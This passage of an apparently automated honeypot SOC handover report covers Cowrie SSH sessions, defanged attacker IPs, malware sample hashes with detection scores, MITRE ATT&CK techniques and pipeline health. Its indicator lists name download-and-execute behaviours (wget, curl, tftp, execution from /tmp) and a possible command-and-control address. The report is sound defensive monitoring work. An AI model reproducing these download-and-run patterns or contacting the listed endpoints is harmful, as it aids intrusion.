| **Last Seen** | 2026-07-12 18:52 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:51:50` | `cowrie.session.connect` |
| `2026-07-12 18:51:51` | `cowrie.login.success` |
| `2026-07-12 18:51:51` | `cowrie.session.params` |
| `2026-07-12 18:51:52` | `cowrie.command.input` |
| `2026-07-12 18:51:52` | `cowrie.command.failed` |
| `2026-07-12 18:51:52` | `cowrie.command.input` |
| `2026-07-12 18:51:52` | `cowrie.command.failed` |
| `2026-07-12 18:51:52` | `cowrie.command.input` |
| `2026-07-12 18:51:52` | `cowrie.command.failed` |
| `2026-07-12 18:51:53` | `cowrie.command.input` |
| `2026-07-12 18:51:53` | `cowrie.command.failed` |
| `2026-07-12 18:51:53` | `cowrie.command.input` |
| `2026-07-12 18:51:53` | `cowrie.command.input` |
| `2026-07-12 18:51:53` | `cowrie.command.failed` |
| `2026-07-12 18:51:53` | `cowrie.command.failed` |
| `2026-07-12 18:52:24` | `cowrie.log.closed` |
| `2026-07-12 18:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca6d0cd0734

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:52 |
| **Last Seen** | 2026-07-12 18:52 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:52:24` | `cowrie.session.connect` |
| `2026-07-12 18:52:25` | `cowrie.login.success` |
| `2026-07-12 18:52:26` | `cowrie.login.success` |
| `2026-07-12 18:52:26` | `cowrie.session.params` |
| `2026-07-12 18:52:27` | `cowrie.command.input` |
| `2026-07-12 18:52:27` | `cowrie.command.failed` |
| `2026-07-12 18:52:27` | `cowrie.command.input` |
| `2026-07-12 18:52:27` | `cowrie.command.failed` |
| `2026-07-12 18:52:28` | `cowrie.command.input` |
| `2026-07-12 18:52:28` | `cowrie.command.input` |
| `2026-07-12 18:52:28` | `cowrie.command.failed` |
| `2026-07-12 18:52:28` | `cowrie.command.failed` |
| `2026-07-12 18:52:59` | `cowrie.log.closed` |
| `2026-07-12 18:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489eacced9cf

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:52 |
| **Last Seen** | 2026-07-12 18:53 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:52:59` | `cowrie.session.connect` |
| `2026-07-12 18:53:00` | `cowrie.login.success` |
| `2026-07-12 18:53:00` | `cowrie.session.params` |
| `2026-07-12 18:53:01` | `cowrie.command.input` |
| `2026-07-12 18:53:01` | `cowrie.command.failed` |
| `2026-07-12 18:53:01` | `cowrie.command.input` |
| `2026-07-12 18:53:01` | `cowrie.command.failed` |
| `2026-07-12 18:53:01` | `cowrie.command.input` |
| `2026-07-12 18:53:01` | `cowrie.command.failed` |
| `2026-07-12 18:53:02` | `cowrie.command.input` |
| `2026-07-12 18:53:02` | `cowrie.command.failed` |
| `2026-07-12 18:53:02` | `cowrie.command.input` |
| `2026-07-12 18:53:02` | `cowrie.command.input` |
| `2026-07-12 18:53:02` | `cowrie.command.failed` |
| `2026-07-12 18:53:02` | `cowrie.command.failed` |
| `2026-07-12 18:53:33` | `cowrie.log.closed` |
| `2026-07-12 18:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-141c1f120893

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:53 |
| **Last Seen** | 2026-07-12 18:54 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:53:33` | `cowrie.session.connect` |
| `2026-07-12 18:53:34` | `cowrie.login.success` |
| `2026-07-12 18:53:34` | `cowrie.session.params` |
| `2026-07-12 18:53:35` | `cowrie.command.input` |
| `2026-07-12 18:53:35` | `cowrie.command.failed` |
| `2026-07-12 18:53:35` | `cowrie.command.input` |
| `2026-07-12 18:53:35` | `cowrie.command.failed` |
| `2026-07-12 18:53:36` | `cowrie.command.input` |
| `2026-07-12 18:53:36` | `cowrie.command.failed` |
| `2026-07-12 18:53:36` | `cowrie.command.input` |
| `2026-07-12 18:53:36` | `cowrie.command.failed` |
| `2026-07-12 18:53:36` | `cowrie.command.input` |
| `2026-07-12 18:53:36` | `cowrie.command.input` |
| `2026-07-12 18:53:36` | `cowrie.command.failed` |
| `2026-07-12 18:53:36` | `cowrie.command.failed` |
| `2026-07-12 18:54:07` | `cowrie.log.closed` |
| `2026-07-12 18:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ba73573a49

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:54 |
| **Last Seen** | 2026-07-12 18:54 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:54:07` | `cowrie.session.connect` |
| `2026-07-12 18:54:08` | `cowrie.login.success` |
| `2026-07-12 18:54:08` | `cowrie.session.params` |
| `2026-07-12 18:54:09` | `cowrie.command.input` |
| `2026-07-12 18:54:09` | `cowrie.command.failed` |
| `2026-07-12 18:54:09` | `cowrie.command.input` |
| `2026-07-12 18:54:09` | `cowrie.command.failed` |
| `2026-07-12 18:54:09` | `cowrie.command.input` |
| `2026-07-12 18:54:09` | `cowrie.command.failed` |
| `2026-07-12 18:54:10` | `cowrie.command.input` |
| `2026-07-12 18:54:10` | `cowrie.command.failed` |
| `2026-07-12 18:54:10` | `cowrie.command.input` |
| `2026-07-12 18:54:10` | `cowrie.command.input` |
| `2026-07-12 18:54:10` | `cowrie.command.failed` |
| `2026-07-12 18:54:10` | `cowrie.command.failed` |
| `2026-07-12 18:54:41` | `cowrie.log.closed` |
| `2026-07-12 18:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **27** | 2026-07-12 17:13 | 2026-07-12 18:53 | 29m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-07-12 17:18 | 2026-07-12 18:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | **2** | 2026-07-12 16:56 | 2026-07-12 18:02 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-07-12 18:07 | 2026-07-12 18:12 | 4m | 0 | `T1592` | 🟢 LOW |
| `104.143.10[.]174` | 1 | 2026-07-12 17:08 | 2026-07-12 17:09 | 61s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-12 18:38 | 2026-07-12 18:38 | 38s | 0 | `T1592` | 🟢 LOW |
| `112.94.5[.]43` | 1 | 2026-07-12 18:30 | 2026-07-12 18:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]20` | 1 | 2026-07-12 17:37 | 2026-07-12 17:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `20.127.116[.]229` | 1 | 2026-07-12 17:47 | 2026-07-12 17:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-07-12 18:38 | 2026-07-12 18:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-12 17:39 | 2026-07-12 17:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]10` | 1 | 2026-07-12 18:15 | 2026-07-12 18:15 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.27.38[.]203` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |
| `112.94.5[.]43` | CN | United-Communications-Network-Technology-Co-Ltd, GuangZhou | **100** ⚠️ | 0 |
| `80.65.90[.]155` | BA | BH Telecom d.d. Sarajevo | **100** ⚠️ | 0 |
| `195.178.110[.]232` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `43.128.81[.]242` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 0 |
| `106.248.238[.]187` | KR | LG Uplus | **100** ⚠️ | 0 |
| `196.219.93[.]108` | EG | TE Data | **100** ⚠️ | 0 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 0 |
| `61.145.181[.]7` | CN | CHINANET Guangdong Province Network | **100** ⚠️ | 0 |
| `203.110.233[.]225` | CN | CHINANET FUJIAN PROVINCE NETWORK | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 158 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 155 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 99 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 98 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 98 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 218 cases |
| Tool 34  | Credential Extractor        | ✅ 195 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 65 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (7.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 158 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-12T19:11:33Z_
